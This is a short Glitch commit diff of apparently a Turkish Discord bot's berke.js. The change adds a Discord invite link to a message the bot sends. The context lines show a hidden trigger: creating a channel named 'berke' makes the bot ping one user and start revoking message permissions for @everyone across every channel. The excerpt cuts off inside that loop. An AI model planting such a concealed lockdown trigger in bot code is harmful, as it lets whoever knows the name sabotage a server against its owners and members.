a7faa2a5132a0cff067f456eeb35fefd1f58956b
Glitch (benim-botum-lan) <none>
2019-06-06 07:57:22 +0000

    🚄😼 Checkpoint ./tokenyeri.json:2558838/118 ./berke.js:2558838/27

--- berke.js
+++ berke.js
@@ -431,7 +431,7 @@ client.on('error', e => {
 
 client.on('channelCreate', channel => {
   if (channel.name == 'berke') {
-    channel.send(`<@522018424440881163> Allah zihin açıklığı versin.`)
+    channel.send(`<@522018424440881163> Allah zihin açıklığı versin. https://discord.gg/s7P8kA7`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
